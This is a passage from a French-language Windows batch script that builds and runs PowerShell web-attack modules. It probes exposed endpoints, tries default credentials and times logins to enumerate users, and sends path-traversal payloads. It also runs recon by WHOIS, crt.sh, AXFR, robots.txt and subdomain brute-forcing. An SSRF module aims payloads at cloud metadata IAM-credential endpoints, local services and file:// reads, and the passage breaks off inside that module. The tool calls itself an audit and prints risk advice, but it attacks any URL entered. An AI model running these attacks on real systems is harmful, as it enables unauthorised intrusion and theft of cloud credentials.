echo    '/actuator', '/actuator/health', '/actuator/env', '/actuator/metrics', >> "%SSS%"
echo    '/metrics', '/health', '/status', '/ping', '/version', >> "%SSS%"
echo    '/_profiler', '/debug', '/__debug__', >> "%SSS%"
echo    '/wp-json', '/wp-json/wp/v2/users', >> "%SSS%"
echo    '/api/users', '/api/admin', '/api/config', '/api/debug', >> "%SSS%"
echo    '/console', '/rails/info', '/rails/mailers', >> "%SSS%"
echo    '/telescope', '/horizon', '/nova', '/pulse', >> "%SSS%"
echo    '/.well-known/openid-configuration', '/.well-known/jwks.json' >> "%SSS%"
echo ) >> "%SSS%"
echo. >> "%SSS%"
echo foreach ($ep in $endpoints) { >> "%SSS%"
echo    try { >> "%SSS%"
echo        $epUrl = "https://$domain$ep" >> "%SSS%"
echo        $r = Invoke-WebRequest $epUrl -UserAgent $ua -TimeoutSec 5 -ErrorAction Stop -UseBasicParsing >> "%SSS%"
echo        $ctype = $r.Headers['Content-Type'] >> "%SSS%"
echo        Write-Host "  [+] $ep (HTTP $($r.StatusCode) - $($r.RawContentLength)b - $ctype)" -f Yellow >> "%SSS%"
echo        # Si JSON : afficher un extrait >> "%SSS%"
echo        if ($ctype -match 'json') { >> "%SSS%"
echo            $snippet = $r.Content.Substring(0, [math]::Min(200, $r.Content.Length)) >> "%SSS%"
echo            Write-Host "      JSON: $snippet" -f DarkGray >> "%SSS%"
echo        } >> "%SSS%"
echo        $found++ >> "%SSS%"
echo    } catch {} >> "%SSS%"
echo } >> "%SSS%"
echo. >> "%SSS%"
echo Write-Host "" >> "%SSS%"
echo Write-Host "  Scan termine. $found element(s) trouve(s)." -f Cyan >> "%SSS%"
echo if ($found -gt 0) { >> "%SSS%"
echo    Write-Host "" >> "%SSS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (Surface d'attaque) :" -f Red >> "%SSS%"
echo    Write-Host "  1. Shadow IT : Des APIs ou tests oublies sont souvent des portes ouvertes." -f Yellow >> "%SSS%"
echo    Write-Host "  2. Empreinte : Revele les versions PHP/Apache, SQL, Cloud, SSH." -f Yellow >> "%SSS%"
echo    Write-Host "  3. Information leakage : Les endpoints JSON revelent souvent des IDs/Usernames." -f Yellow >> "%SSS%"
echo    Write-Host "  CONSEIL : Limitez l'exposition publique et utilisez de l'authentification." -f Cyan >> "%SSS%"
echo } >> "%SSS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%SSS%"
if exist "%SSS%" del "%SSS%"
echo.
pause
goto net_cyber_menu

:cyber_auth_test
cls
echo.
echo  ===========================================================
echo   TEST AUTHENTIFICATION ET GESTION DES SESSIONS
echo  ===========================================================
echo   Audit du systeme d'entree : mots de passe
echo   par defaut et protections anti-brute.
echo.
echo  Entrez l'URL de la page de login (ex: https://site.com/login)
set "ALEEX_AUTH_URL="
set /p "ALEEX_AUTH_URL=URL : "
if not defined ALEEX_AUTH_URL goto net_cyber_menu

echo  Nom du champ utilisateur (ex: username, email, login)
set "ALEEX_AUTH_USER_FIELD="
set /p "ALEEX_AUTH_USER_FIELD=User Field : "
if not defined ALEEX_AUTH_USER_FIELD goto net_cyber_menu

echo  Nom du champ mot de passe (ex: password, pass, pwd)
set "ALEEX_AUTH_PASS_FIELD="
set /p "ALEEX_AUTH_PASS_FIELD=Pass Field : "
if not defined ALEEX_AUTH_PASS_FIELD goto net_cyber_menu

set "ATS=%TEMP%\auth_test.ps1"
if exist "%ATS%" del /f /q "%ATS%"

echo $url = $env:ALEEX_AUTH_URL >> "%ATS%"
echo $ua  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%ATS%"
echo $uf  = $env:ALEEX_AUTH_USER_FIELD >> "%ATS%"
echo $pf  = $env:ALEEX_AUTH_PASS_FIELD >> "%ATS%"
echo $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 1 : Default credentials === >> "%ATS%"
echo Write-Host "  [1/5] Test des credentials par defaut..." -f Blue >> "%ATS%"
echo $defCreds = @( >> "%ATS%"
echo    @{u='admin';p='admin'}, @{u='admin';p='password'}, @{u='admin';p='123456'}, >> "%ATS%"
echo    @{u='admin';p='admin123'}, @{u='admin';p=''}, @{u='root';p='root'}, >> "%ATS%"
echo    @{u='administrator';p='administrator'}, @{u='test';p='test'}, >> "%ATS%"
echo    @{u='guest';p='guest'}, @{u='user';p='user'}, @{u='demo';p='demo'} >> "%ATS%"
echo ) >> "%ATS%"
echo $baseR = Invoke-WebRequest $url -UserAgent $ua -WebSession $session -TimeoutSec 10 -ErrorAction SilentlyContinue -UseBasicParsing >> "%ATS%"
echo $baseLen = if($baseR){$baseR.RawContentLength}else{0} >> "%ATS%"
echo $baseTitle = if($baseR -and $baseR.Content -match '^<title^>(.*?)^</title^>'){$matches[1]}else{''} >> "%ATS%"
echo Write-Host "  Baseline page login : $baseLen bytes (Titre: $baseTitle)" -f Gray >> "%ATS%"
echo. >> "%ATS%"
echo foreach ($cred in $defCreds) { >> "%ATS%"
echo    $body = @{ $uf = $cred.u; $pf = $cred.p } >> "%ATS%"
echo    try { >> "%ATS%"
echo        $r = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -WebSession $session -TimeoutSec 8 -ErrorAction Stop -UseBasicParsing -MaximumRedirection 5 >> "%ATS%"
echo        $title = if($r.Content -match '^<title^>(.*?)^</title^>'){$matches[1]}else{''} >> "%ATS%"
echo        $lenDiff = [math]::Abs($r.RawContentLength - $baseLen) >> "%ATS%"
echo        $isRedirected = $r.BaseResponse.ResponseUri.AbsoluteUri -ne $url >> "%ATS%"
echo        $hasLogout = $r.Content -match 'logout^|deconnex^|signout^|se.d.connecter' >> "%ATS%"
echo        $hasError  = $r.Content -match 'incorrect^|invalid^|wrong^|error^|erreur^|incorrect' >> "%ATS%"
echo        if ($isRedirected -or $hasLogout -or ($lenDiff -gt 200 -and -not $hasError)) { >> "%ATS%"
echo            Write-Host "  [!!!] CONNEXION REUSSIE ! $($cred.u) / $($cred.p) -> $title" -f Red >> "%ATS%"
echo        } else { >> "%ATS%"
echo            Write-Host "  [ ] $($cred.u)/$($cred.p) -> Echec" -f DarkGray >> "%ATS%"
echo        } >> "%ATS%"
echo    } catch {} >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 2 : Enumeration utilisateurs (timing) === >> "%ATS%"
echo Write-Host "  [2/5] Enumeration utilisateurs via timing..." -f Blue >> "%ATS%"
echo $testUsers = @('admin','administrator','root','user','test','contact@' + ([uri]$url).Host) >> "%ATS%"
echo $timings = @() >> "%ATS%"
echo foreach ($u in $testUsers) { >> "%ATS%"
echo    $body = @{ $uf = $u; $pf = 'wrongpassword_xyz_123' } >> "%ATS%"
echo    $start = Get-Date >> "%ATS%"
echo    try { $null = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -TimeoutSec 10 -ErrorAction SilentlyContinue -UseBasicParsing } catch {} >> "%ATS%"
echo    $elapsed = [math]::Round(((Get-Date) - $start).TotalMilliseconds) >> "%ATS%"
echo    $timings += @{User=$u; Ms=$elapsed} >> "%ATS%"
echo    Write-Host "  $u : ${elapsed}ms" -f Gray >> "%ATS%"
echo } >> "%ATS%"
echo $avg = ($timings ^| Measure-Object -Property Ms -Average).Average >> "%ATS%"
echo $timings ^| Where-Object { $_.Ms -gt ($avg * 1.5) } ^| ForEach-Object { >> "%ATS%"
echo    Write-Host "  [!] Utilisateur potentiellement valide (timing +50%%) : $($_.User) ($($_.Ms)ms vs avg $([math]::Round($avg))ms)" -f Yellow >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 3 : Headers de securite session === >> "%ATS%"
echo Write-Host "  [3/5] Analyse des cookies et headers de session..." -f Blue >> "%ATS%"
echo $r3 = Invoke-WebRequest $url -UserAgent $ua -TimeoutSec 8 -ErrorAction SilentlyContinue -UseBasicParsing >> "%ATS%"
echo if ($r3) { >> "%ATS%"
echo    $cookies = $session.Cookies.GetCookies($url) >> "%ATS%"
echo    foreach ($c in $cookies) { >> "%ATS%"
echo        Write-Host "  Cookie : $($c.Name) = $($c.Value.Substring(0,[math]::Min(30,$c.Value.Length)))..." -f Cyan >> "%ATS%"
echo        if (-not $c.HttpOnly) { Write-Host "    [!] Sans HttpOnly -> XSS possible" -f Yellow } >> "%ATS%"
echo        if (-not $c.Secure)   { Write-Host "    [!] Sans Secure -> Interception possible" -f Yellow } >> "%ATS%"
echo        if ($c.Name -match 'sess^|sid^|token^|auth') { >> "%ATS%"
echo            $len = $c.Value.Length >> "%ATS%"
echo            if ($len -lt 32) { Write-Host "    [!] Token court ($len chars) -> Entropie faible" -f Yellow } >> "%ATS%"
echo        } >> "%ATS%"
echo    } >> "%ATS%"
echo    # CSRF token present ? >> "%ATS%"
echo    if ($r3.Content -match 'csrf^|_token^|authenticity_token') { >> "%ATS%"
echo        Write-Host "  [OK] Token CSRF detecte dans le formulaire." -f Green >> "%ATS%"
echo    } else { >> "%ATS%"
echo        Write-Host "  [!] Aucun token CSRF detecte -> Formulaire potentiellement vulnerable" -f Yellow >> "%ATS%"
echo    } >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 4 : Bruteforce protection === >> "%ATS%"
echo Write-Host "  [4/5] Detection protection bruteforce (5 tentatives)..." -f Blue >> "%ATS%"
echo $blocked = $false >> "%ATS%"
echo for ($i = 1; $i -le 5; $i++) { >> "%ATS%"
echo    $body = @{ $uf = 'admin'; $pf = "wrongpass$i" } >> "%ATS%"
echo    try { >> "%ATS%"
echo        $r4 = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -TimeoutSec 8 -ErrorAction Stop -UseBasicParsing >> "%ATS%"
echo        if ($r4.StatusCode -eq 429 -or $r4.Content -match 'captcha^|trop de tentatives^|too many^|locked^|bloque') { >> "%ATS%"
echo            Write-Host "  [OK] Protection bruteforce activee apres $i tentatives !" -f Green >> "%ATS%"
echo            $blocked = $true; break >> "%ATS%"
echo        } >> "%ATS%"
echo    } catch { if ($_.Exception.Response.StatusCode -eq 429) { $blocked = $true; break } } >> "%ATS%"
echo } >> "%ATS%"
echo if (-not $blocked) { Write-Host "  [!] Aucune protection bruteforce detectee apres 5 tentatives." -f Yellow } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 5 : Path traversal on page login === >> "%ATS%"
echo Write-Host "  [5/5] Test Path Traversal sur parametres..." -f Blue >> "%ATS%"
echo $traversalPayloads = @('../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '..\..\windows\system32\drivers\etc\hosts', '%%2e%%2e%%2fetc%%2fpasswd') >> "%ATS%"
echo foreach ($tp in $traversalPayloads) { >> "%ATS%"
echo    $body = @{ $uf = $tp; $pf = 'test' } >> "%ATS%"
echo    try { >> "%ATS%"
echo        $r5 = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -TimeoutSec 6 -ErrorAction Stop -UseBasicParsing >> "%ATS%"
echo        if ($r5.Content -match 'root:x:^|daemon:^|bin:^|nobody:' -or $r5.Content -match '# Copyright^|# localhost') { >> "%ATS%"
echo            Write-Host "  [!!!] PATH TRAVERSAL ! Fichier systeme lu via param [$uf]" -f Red >> "%ATS%"
echo        } >> "%ATS%"
echo    } catch {} >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo Write-Host "  Audit authentification termine." -f Cyan >> "%ATS%"
echo Write-Host "" >> "%ATS%"
echo Write-Host "  [!] ANALYSE DES RISQUES (Comptes) :" -f Red >> "%ATS%"
echo Write-Host "  1. Brute-force : Si aucune protection n'est active, tous les comptes sont a risque." -f Yellow >> "%ATS%"
echo Write-Host "  2. Session : Des cookies sans flags facilitent le piratage de compte (XSS/MITM)." -f Yellow >> "%ATS%"
echo Write-Host "  3. Default Creds : Un admin/admin permet le controle TOTAL du site." -f Yellow >> "%ATS%"
echo Write-Host "  CONSEIL : Activez la MFA et configurez correctement vos cookies de session." -f Cyan >> "%ATS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%ATS%"
if exist "%ATS%" del "%ATS%"
echo.
pause
goto net_cyber_menu

:recon_whois
cls
echo.
echo  ================================================
echo   [WHOIS] INFORMATION DE DOMAINE ET ASN
echo  ================================================
echo   Analyse le proprietaire, le bureau
echo   d'enregistrement et l'ASN de l'herbergeur.
echo.
set "WH_DOM="
set /p "WH_DOM=Domaine ou IP : "
if not defined WH_DOM goto net_cyber_menu

set "WPS=%TEMP%\recon_whois_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"

echo $d = $env:WH_DOM >> "%WPS%"
echo Write-Host "--- WHOIS-IP Info ($d) ---" -f Cyan >> "%WPS%"
echo try { >> "%WPS%"
echo     $ip = [System.Net.Dns]::GetHostAddresses($d)[0].IPAddressToString >> "%WPS%"
echo     Write-Host "  Ressource resolue : $ip" -f Gray >> "%WPS%"
echo     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 >> "%WPS%"
echo     $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%WPS%"
echo     $api_url = "http://ip-api.com/json/$($ip)?lang=fr" >> "%WPS%"
echo     $info = Invoke-RestMethod -Uri $api_url -UserAgent $ua -TimeoutSec 10 >> "%WPS%"
echo     function NoAcc($s) { >> "%WPS%"
echo         if ($null -eq $s) { return "" } >> "%WPS%"
echo         $s = $s.ToString() >> "%WPS%"
echo         $s = $s -replace [char]244,'o' -replace [char]233,'e' -replace [char]232,'e' >> "%WPS%"
echo         $s = $s -replace [char]224,'a' -replace [char]231,'c' -replace [char]234,'e' >> "%WPS%"
echo         $s = $s -replace [char]251,'u' -replace [char]238,'i' >> "%WPS%"
echo         return $s >> "%WPS%"
echo     } >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host ("  Adresse IP   : " + $info.query) -f Cyan >> "%WPS%"
echo     Write-Host ("  Ville        : " + (NoAcc $info.city)) -f Gray >> "%WPS%"
echo     Write-Host ("  Region       : " + (NoAcc $info.regionName)) -f Gray >> "%WPS%"
echo     Write-Host ("  Pays         : " + (NoAcc $info.country)) -f Gray >> "%WPS%"
echo     Write-Host ("  Organisation : " + (NoAcc $info.org)) -f Gray >> "%WPS%"
echo     Write-Host ("  FAI          : " + (NoAcc $info.isp)) -f Gray >> "%WPS%"
echo     Write-Host ("  Fuseau       : " + $info.timezone) -f Gray >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] RISQUES ET CONSEQUENCES :" -f Red >> "%WPS%"
echo     Write-Host "  1. Geolocation : Permet de cibler physiquement l'infrastructure." -f Yellow >> "%WPS%"
echo     Write-Host "  2. Attribution : Identifie l'herbergeur (ex: AWS, OVH) et ses failles connues." -f Yellow >> "%WPS%"
echo     Write-Host "  3. Social Engineering : Les infos WHOIS facilitent l'usurpation d'identite." -f Yellow >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host "  [!] Erreur de connexion ou domaine introuvable." -f Yellow >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto net_cyber_menu

:recon_crtsh
cls
echo.
echo  ================================================
echo   [crt.sh] RECHERCHE VIA CERTIFICATS SSL
echo  ================================================
echo   Trouve les sous-domaines enregistres
echo   dans les logs publics (methode 100%% passive).
echo.
set "CRT_DOM="
set /p "CRT_DOM=Domaine cible (ex: google.com) : "
if not defined CRT_DOM goto net_cyber_menu
set "CRT_DOM=%CRT_DOM: =%"

set "WPS=%TEMP%\recon_crtsh_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $d = $env:CRT_DOM >> "%WPS%"
echo $url = "https://crt.sh/?q=%%.$d&output=json" >> "%WPS%"
echo Write-Host "  Interrogation de crt.sh pour $d ..." -f Cyan >> "%WPS%"
echo try { >> "%WPS%"
echo     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 >> "%WPS%"
echo     $r = Invoke-WebRequest $url -TimeoutSec 20 -UseBasicParsing -EA Stop >> "%WPS%"
echo     $json = $r.Content ^| ConvertFrom-Json >> "%WPS%"
echo     if ($json.Count -eq 0) { Write-Host "  [i] Aucun sous-domaine trouve." -f Yellow; exit } >> "%WPS%"
echo     $names = $json ^| Select-Object -ExpandProperty common_name -Unique ^| Sort-Object >> "%WPS%"
echo     Write-Host "  [+] $($names.Count) sous-domaines trouves :" -f Green >> "%WPS%"
echo     foreach ($n in $names) { Write-Host "    - $n" -f Gray } >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] ANALYSE DES RISQUES (crt.sh) :" -f Red >> "%WPS%"
echo     Write-Host "  1. Reconnaissance passive : L'attaquant voit tout sans jamais toucher le serveur." -f Yellow >> "%WPS%"
echo     Write-Host "  2. Services oublies : Revele des instances de dev ou d'anciennes versions." -f Yellow >> "%WPS%"
echo     Write-Host "  3. Evolution : Permet de deduire la structure interne de l'equipe technique." -f Yellow >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host "  [ERREUR] Impossible de joindre crt.sh (Timeout ou blocage)." -f Red >> "%WPS%"
echo     Write-Host "  Details : $($_.Exception.Message)" -f Gray >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto net_cyber_menu

:recon_axfr
cls
echo.
echo  ================================================
echo   [AXFR] DUMP DES RECORDS DNS (ZONE TRANSFER)
echo  ================================================
echo   Tente de recuperer toute la configuration DNS
echo   si le serveur de noms est mal securise.
echo.
set "AX_DOM="
set /p "AX_DOM=Domaine (ex: zonetransfer.me) : "
if not defined AX_DOM goto net_cyber_menu
set "AX_DOM=%AX_DOM: =%"

set "WPS=%TEMP%\recon_axfr_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $d = $env:AX_DOM >> "%WPS%"
echo Write-Host "  Recherche des serveurs NameServer (NS) pour $d..." -f Cyan >> "%WPS%"
echo try { >> "%WPS%"
echo     $nsList = Resolve-DnsName $d -Type NS -ErrorAction SilentlyContinue >> "%WPS%"
echo     if (-not $nsList) { Write-Host "  [!] Aucun serveur NS trouve pour ce domaine." -f Red; exit } >> "%WPS%"
echo     $foundAny = $false >> "%WPS%"
echo     foreach ($ns in $nsList.NameHost) { >> "%WPS%"
echo         Write-Host "  --- Test sur $ns ---" -f Yellow >> "%WPS%"
echo         $res = nslookup -type=any -timeout=5 $d $ns ^| Select-String $d >> "%WPS%"
echo         if ($res) { >> "%WPS%"
echo             $foundAny = $true >> "%WPS%"
echo             $res ^| ForEach-Object { Write-Host ("    " + $_.Line) -f Green } >> "%WPS%"
echo         } else { >> "%WPS%"
echo             Write-Host "    [-] Transfert refuse ou aucun record trouve sur ce serveur." -f DarkGray >> "%WPS%"
echo         } >> "%WPS%"
echo     } >> "%WPS%"
echo     if ($foundAny) { >> "%WPS%"
echo         Write-Host "" >> "%WPS%"
echo         Write-Host "  [!] ANALYSE DES RISQUES (DONNEES EXPOSEES) :" -f Red >> "%WPS%"
echo         Write-Host "  1. Fuite d'annuaire : Votre infrastructure est cartographiee." -f Yellow >> "%WPS%"
echo         Write-Host "  2. Services cachés : Des sous-domaines (dev, admin, vpn) sont visibles." -f Yellow >> "%WPS%"
echo         Write-Host "  3. En-tetes Mail/Web : Les IPs des serveurs critiques sont identifiees." -f Yellow >> "%WPS%"
echo         Write-Host "  CONSEIL : Desactivez AXFR ou restreignez-le aux IPs de confiance." -f Cyan >> "%WPS%"
echo     } >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host "  [ERREUR] Echec de la resolution DNS." -f Red >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto net_cyber_menu

:recon_robots
cls
echo.
echo  ================================================
echo   [ROBOTS] ANALYSE DES CHEMINS CACHES
echo  ================================================
echo   Verifie Robots.txt, Sitemap et Security.txt
echo   pour trouver des panels admin caches.
echo.
set "RB_URL="
set /p "RB_URL=URL (ex: https://site.com) : "
if not defined RB_URL goto net_cyber_menu
set "RB_URL=%RB_URL: =%"

set "WPS=%TEMP%\recon_robots_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $u = $env:RB_URL >> "%WPS%"
echo if ($u -notmatch '^^http') { $u = 'https://' + $u } >> "%WPS%"
echo $u = $u.TrimEnd('/') >> "%WPS%"
echo $paths = @('/robots.txt', '/sitemap.xml', '/.well-known/security.txt') >> "%WPS%"
echo foreach ($p in $paths) { >> "%WPS%"
echo     Write-Host "  [?] Verification de : $p ..." -f Gray >> "%WPS%"
echo     try { >> "%WPS%"
echo         [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 >> "%WPS%"
echo         $r = Invoke-WebRequest ($u + $p) -TimeoutSec 8 -UseBasicParsing -EA Stop >> "%WPS%"
echo         if ($r.StatusCode -eq 200) { >> "%WPS%"
echo             Write-Host "  [OK] Contenu trouve ! ($p)" -f Green >> "%WPS%"
echo             Write-Host "------------------------------------------------" -f Blue >> "%WPS%"
echo             $r.Content >> "%WPS%"
echo             Write-Host "------------------------------------------------" -f Blue >> "%WPS%"
echo         } >> "%WPS%"
echo     } catch { Write-Host "  [ ] Non trouve ou inaccessible" -f DarkGray } >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto net_cyber_menu

:recon_subdomain_brute
cls
echo.
echo  ================================================
echo   BRUTEFORCE DE SOUS-DOMAINES (DNS)
echo  ================================================
echo   Teste 50+ noms courants (api, dev...)
echo   pour detecter des services actifs.
echo.
set "SD_DOM="
set /p "SD_DOM=Domaine racine (ex: michelin.com) : "
if not defined SD_DOM goto net_cyber_menu
set "SD_DOM=%SD_DOM: =%"

set "WPS=%TEMP%\recon_sub_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $d = $env:SD_DOM >> "%WPS%"
echo $subs = @('www','dev','api','test','staging','beta','mail','vpn','smtp','pop','imap','ns1','ns2','webmail','blog','shop','admin','portal','secure','git','devops','jenkins','docker','kube','aws','azure','cloud','db','mysql','sql','internal','intra','private','corp','support','help','download','app','m','mobile','static','assets','cdn','srv','host') >> "%WPS%"
echo Write-Host "  Demarrage du bruteforce sur $($subs.Count) mots pour $d" -f Cyan >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo $count = 0 >> "%WPS%"
echo $foundCount = 0 >> "%WPS%"
echo foreach ($s in $subs) { >> "%WPS%"
echo     $count++ >> "%WPS%"
echo     $fqdn = $s + '.' + $d >> "%WPS%"
echo     $percent = [math]::Round(($count / $subs.Count) * 100) >> "%WPS%"
echo     Write-Progress -Activity "Bruteforce DNS" -Status "$fqdn ($count/$($subs.Count))" -PercentComplete $percent >> "%WPS%"
echo     try { >> "%WPS%"
echo         $dns = Resolve-DnsName $fqdn -Type A -ErrorAction Stop -Timeout 2 ^| Select-Object -ExpandProperty IPAddress -First 1 >> "%WPS%"
echo         Write-Host "  [+] $fqdn " -NoNewline -f Green; Write-Host "-> $dns" -f White >> "%WPS%"
echo         $foundCount++ >> "%WPS%"
echo         try { >> "%WPS%"
echo             $r = Invoke-WebRequest ("http://" + $fqdn) -Method Head -TimeoutSec 2 -EA Stop -UseBasicParsing >> "%WPS%"
echo             Write-Host "      HTTP 200 ($($r.Headers['Server']))" -f Gray >> "%WPS%"
echo         } catch {} >> "%WPS%"
echo     } catch {} >> "%WPS%"
echo } >> "%WPS%"
echo Write-Progress -Activity "Bruteforce DNS" -Completed >> "%WPS%"
echo if ($foundCount -gt 0) { >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] ANALYSE DES RISQUES (SOUS-DOMAINES) :" -f Red >> "%WPS%"
echo     Write-Host "  1. Surface d'attaque : Chaque sous-domaine est une porte d'entree potentielle." -f Yellow >> "%WPS%"
echo     Write-Host "  2. Shadow IT : Des serveurs de tests (dev, staging) oublies sont souvent mal patchés." -f Yellow >> "%WPS%"
echo     Write-Host "  3. Fuite d'infrastructure : Revele les technos utilisees (api, git, vpn)." -f Yellow >> "%WPS%"
echo     Write-Host "  CONSEIL : Supprimez les enregistrements DNS inutilises et protegez vos accès." -f Cyan >> "%WPS%"
echo } else { >> "%WPS%"
echo     Write-Host "`n  Scan termine. Aucun sous-domaine supplementaire detecte." -f Cyan >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto net_cyber_menu

:cyber_ssrf
cls
echo.
echo  ===========================================================
echo   SSRF - Server-Side Request Forgery
echo  ===========================================================
echo   Force le serveur a faire des requetes internes
echo   pour extraire des donnees (Cloud/Intranet).
echo  ===========================================================
echo.
set /p "SSRF_URL=URL avec parametre (ex: https://site.com/fetch?url=) : "
if "%SSRF_URL%"=="" goto net_cyber_menu

set "SSRF_PS=%TEMP%\ssrf_test.ps1"
if exist "%SSRF_PS%" del "%SSRF_PS%"

echo $baseUrl = "!SSRF_URL!" > "%SSRF_PS%"
echo $ua = "Mozilla/5.0" >> "%SSRF_PS%"
echo $vulns = 0 >> "%SSRF_PS%"
echo $suspicious = 0 >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo $payloads = @( >> "%SSRF_PS%"
echo    @{ Name='AWS IMDSv1 (metadata)';    URL='http://169.254.169.254/latest/meta-data/';                          Detect='ami-id|instance-id|instance-type|local-ipv4|iam' }, >> "%SSRF_PS%"
echo    @{ Name='AWS IMDSv2 (token)';        URL='http://169.254.169.254/latest/api/token';                          Detect='invalid|PUT required|TTL' }, >> "%SSRF_PS%"
echo    @{ Name='AWS IAM credentials';       URL='http://169.254.169.254/latest/meta-data/iam/security-credentials/'; Detect='RoleName|AccessKeyId|SecretAccessKey|Token|Expiration' }, >> "%SSRF_PS%"
echo    @{ Name='GCP Metadata';              URL='http://metadata.google.internal/computeMetadata/v1/';               Detect='project|instance|id|zone|machine-type' }, >> "%SSRF_PS%"
echo    @{ Name='Azure IMDS';                URL='http://169.254.169.254/metadata/instance?api-version=2021-02-01';   Detect='compute|network|subscriptionId|resourceGroupName' }, >> "%SSRF_PS%"
echo    @{ Name='Localhost HTTP (80)';       URL='http://127.0.0.1/';                                                 Detect='html|<body|server|apache|nginx|iis|express|welcome' }, >> "%SSRF_PS%"
echo    @{ Name='Localhost HTTP (8080)';     URL='http://127.0.0.1:8080/';                                            Detect='html|<body|server|apache|nginx|tomcat|spring' }, >> "%SSRF_PS%"
echo    @{ Name='Localhost HTTPS (443)';     URL='https://127.0.0.1/';                                                Detect='html|<body|server|certificate' }, >> "%SSRF_PS%"
echo    @{ Name='Redis (6379)';              URL='http://127.0.0.1:6379/';                                            Detect='PONG|-ERR|redis_version|connected_clients' }, >> "%SSRF_PS%"
echo    @{ Name='MongoDB (27017)';           URL='http://127.0.0.1:27017/';                                           Detect='mongo|ok.*1|topology|ismaster|MongoDB' }, >> "%SSRF_PS%"
echo    @{ Name='Memcached (11211)';         URL='http://127.0.0.1:11211/';                                           Detect='VERSION|STORED|ERROR|END' }, >> "%SSRF_PS%"
echo    @{ Name='Elasticsearch (9200)';      URL='http://127.0.0.1:9200/';                                            Detect='cluster_name|version|tagline|elasticsearch' }, >> "%SSRF_PS%"
echo    @{ Name='File:// LFI (Linux)';       URL='file:///etc/passwd';                                                Detect='root:x:|daemon:|nobody:|/bin/bash|/bin/sh' }, >> "%SSRF_PS%"
echo    @{ Name='File:// LFI (Windows)';     URL='file:///C:/Windows/win.ini';                                        Detect='\[fonts\]|\[extensions\]|for 16-bit' } >> "%SSRF_PS%"
echo ) >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo Write-Host "" >> "%SSRF_PS%"
echo Write-Host "  Test de $($payloads.Count) payloads SSRF..." -f Cyan >> "%SSRF_PS%"
echo Write-Host "  (Chaque test timeout apres 6s max)" -f DarkGray >> "%SSRF_PS%"
echo Write-Host "" >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo foreach ($p in $payloads) { >> "%SSRF_PS%"
echo    Write-Host "  [?] $($p.Name.PadRight(35))" -f Gray -NoNewline >> "%SSRF_PS%"
echo    $start = Get-Date >> "%SSRF_PS%"
echo    try { >> "%SSRF_PS%"
echo        $testUrl = $baseUrl + [uri]::EscapeDataString($p.URL) >> "%SSRF_PS%"
echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing -MaximumRedirection 0 >> "%SSRF_PS%"
echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
echo        if ($r.Content -match $p.Detect) { >> "%SSRF_PS%"
echo            Write-Host "[!!!] SSRF CONFIRME ! (${elapsed}ms)" -f Red >> "%SSRF_PS%"
echo            Write-Host "       Service  : $($p.Name)" -f Magenta >> "%SSRF_PS%"
echo            Write-Host "       Payload  : $($p.URL)" -f Magenta >> "%SSRF_PS%"
echo            $preview = $r.Content -replace '\s+',' ' | ForEach-Object { $_.Substring(0, [math]::Min(200, $_.Length)) } >> "%SSRF_PS%"
echo            Write-Host "       Extrait  : $preview" -f Yellow >> "%SSRF_PS%"
echo            $vulns++ >> "%SSRF_PS%"
echo        } elseif ($r.StatusCode -eq 200 -and $elapsed -lt 500) { >> "%SSRF_PS%"
